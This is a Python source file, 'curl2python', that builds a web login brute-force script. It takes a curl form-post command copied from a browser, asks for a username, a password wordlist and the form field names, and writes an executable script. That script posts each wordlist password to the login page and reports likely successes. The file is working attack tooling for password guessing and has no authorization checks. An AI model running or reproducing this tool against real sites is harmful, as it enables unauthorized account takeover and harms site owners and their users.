#!/usr/bin/env python3

"""
Curl2python

This scripts takes the command-line arguments of a Curl
form-post request, and creates a web login brute force
script based on it. It's a script that creates a script.

You can get the command-line arguments conveniently
from e.g. Firefox.

While you're looking at login page on some website,
you open the developer tools in the browser and
select the network tab, you then try to login with
some random credentials off the top of your head,
then select the login request in the developer tools,
copy it _as Curl_, then switch to the terminal, and
either paste the command as-is or edit it by whatever
means you prefer, substituting 'curl' with 'curl2python'.

You run the script, answer the questions, providing a
(username, password file/wordlist, form field names,
and what the resulting script should be named) and
the result should be a runnable python script.
"""

from urllib.parse import unquote
# import requests
import argparse
import os
from io import StringIO


# pylint: disable=too-many-arguments
def write_python_script(
        url, headers, data, username_field, password_field,
        username, password_file, script_name):
    """
    Compose a python script, write it to a file and chmod +x it.
    """

    builder = StringIO()

    builder.write(f"""#!/usr/bin/env python3

import requests
#import time

URL = "{url}"

USERNAME = "{username}"
PASSWORD_FILE = "{password_file}"

USERNAME_FIELD = "{username_field}"
PASSWORD_FIELD = "{password_field}"

HEADERS = {{
""")

    for key, value in headers.items():
        builder.write(f"    '{key}': '{value}',\n")

    builder.write("""
}

DATA = {
""")

    for key, value in data.items():
        builder.write(f"    '{key}': '{value}',\n")

    builder.write("""
}

def try_login(password):
    print(f"Trying {USERNAME}:{password}")
    DATA[USERNAME_FIELD] = USERNAME
    DATA[PASSWORD_FIELD] = password

    response = requests.post(URL, headers=HEADERS, data=DATA)

    text = response.text.lower()

    if "invalid" in text or "incorrect" in text or "empty" in text:
        print(f"[-] {USERNAME}:{password}")
    else:
        if response.status_code == 301:
            print(f"[+]: {USERNAME}:{password}")
            exit()
        else:
            print(f"[?]: {USERNAME}:{password}")

    #time.sleep(0.05)


def main():
    with open(PASSWORD_FILE, encoding='utf-8', errors='ignore') as file:
        for password in file:
            password = password.rstrip('\\n')
            if password.isspace():
                continue
            try_login(password)


if __name__ == "__main__":
    main()
""")

    result = builder.getvalue()
    builder.close()

    with open(script_name, "w", encoding="utf-8") as file:
        file.write(result)

    permissions = os.stat(script_name).st_mode
    permissions |= 0o100
    os.chmod(script_name, permissions)


def headers_as_dictionary(headers):
    """
    Take a list of header values in curl format,
    and store them in a dictionary.
    """
    dictionary = {}
    for h in headers:
        key, value = h.split(':', 1)
        key = key.strip()
        value = value.strip()
        dictionary[key] = value
    return dictionary


def data_as_dictionary(data):
    """
    Take a url-encoded data string
    and store it as a dictionary.
    """
    data = unquote(data)
    dictionary = {}
    parameters = data.split('&')
    for p in parameters:
        key, value = p.split('=', 1)
        key = key.strip()
        value = value.strip()
        dictionary[key] = value
    return dictionary


def main():
    """
    Start the program, define the arguments,
    get user input,
    and call the function that generates the script.
    """

    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="the url of the login form")
    parser.add_argument(
            "-X", required=True,
            help="the form method, get or post")
    parser.add_argument(
            "-H", "--header", nargs="*", action="extend",
            help="an http header, in key:value format")
    parser.add_argument(
            "--data-raw", required=True,
            help="the form data in raw form, urlencoded")

    args = parser.parse_args()

    headers = headers_as_dictionary(args.header)

    data = data_as_dictionary(args.data_raw)

    print("""
    A few more things are needed:
    * username
    * password file or wordlist
    * form field names
     ...
    * the name of the script to write
    """)

    username = input("Username: ")
    password_file = input("Password file: ")
    username_field = input("Username form field name: ")
    password_field = input("Password form field name: ")
    script_name = input("Name the script: ")

    write_python_script(args.url, headers, data,
                        username_field, password_field,
                        username, password_file,
                        script_name)


if __name__ == "__main__":
    main()
